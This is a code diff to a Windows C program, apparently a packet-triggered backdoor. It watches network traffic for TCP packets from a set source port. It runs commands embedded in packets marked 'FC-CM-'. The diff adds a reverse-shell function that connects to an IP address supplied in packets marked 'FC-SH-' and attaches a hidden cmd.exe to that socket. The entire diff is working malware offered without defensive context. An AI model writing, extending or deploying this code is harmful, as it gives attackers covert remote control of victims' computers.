@@ -1,6 +1,36 @@
 #include "femtocell.h"
 
-void execCmd(char* cmd)
+void rev(char* ip)
+{
+	WSADATA wsaData;
+	SOCKET wSock;
+	struct sockaddr_in hax;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+	hax.sin_family = AF_INET;
+	hax.sin_port = htons(REV_PORT);
+	hax.sin_addr.s_addr = inet_addr(ip);
+
+	WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+	memset(&si, 0, sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;
+
+	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+	{
+		printf("CreateProcess failed (%d).\n", GetLastError());
+		return;
+	}
+}
+
+void exec(char* cmd)
 {
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
@@ -9,17 +39,7 @@ void execCmd(char* cmd)
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 	
-	if (!CreateProcessA(NULL,   
-		cmd,        
-		NULL,           
-		NULL,           
-		FALSE,          
-		CREATE_NO_WINDOW,       
-		NULL,           
-		NULL,         
-		&si,     
-		&pi)    
-		)
+	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
 		printf("CreateProcess failed (%d).\n", GetLastError());
 		return;
@@ -90,7 +110,7 @@ int main(int argc, char** argv)
 		{
 			struct tcp_hdr_s* tcp_header = (buffer + BUFFER_OFFSET_L4);
 			uint16_t sport = ntohs(tcp_header->th_sport);
-			if (sport == 77)
+			if (sport == SRC_PORT)
 			{
 				uint16_t flag = (uint16_t)tcp_header->th_flags;
 				BOOL push = (flag >> 3) % 2;
@@ -104,11 +124,12 @@ int main(int argc, char** argv)
 					if (payloadLength > 6 && strncmp(data, "FC-SH-", 6) == 0)
 					{
 						char* rip = (char*)data + 6;
+						rev(rip);
 					}
 					else if (payloadLength > 6 && strncmp(data, "FC-CM-", 6) == 0)
 					{
 						char* cmd = (char*)data + 6;
-						execCmd(cmd);
+						exec(cmd);
 					}
 				}
 			}
